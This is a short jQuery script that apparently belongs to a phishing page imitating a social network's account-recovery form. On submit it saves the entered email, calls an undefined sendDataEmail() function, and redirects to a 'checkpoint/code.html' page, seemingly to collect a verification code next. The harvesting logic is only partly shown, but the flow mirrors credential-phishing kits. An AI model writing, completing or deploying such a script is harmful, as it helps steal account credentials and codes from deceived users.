$(document).ready(function () {
    $("#did_submit").click(function () {
        if($("#identify_email").val() === '') 
            {
                $('.pam').removeClass('hidden_elem');
                return;
            }
            else
            {
                 localStorage.setItem('recover',$('#identify_email').val());
                 sendDataEmail();
                 setTimeout(function() {
                    window.location.href = "../checkpoint/code.html";
                }, 2000); 
            }
    });
});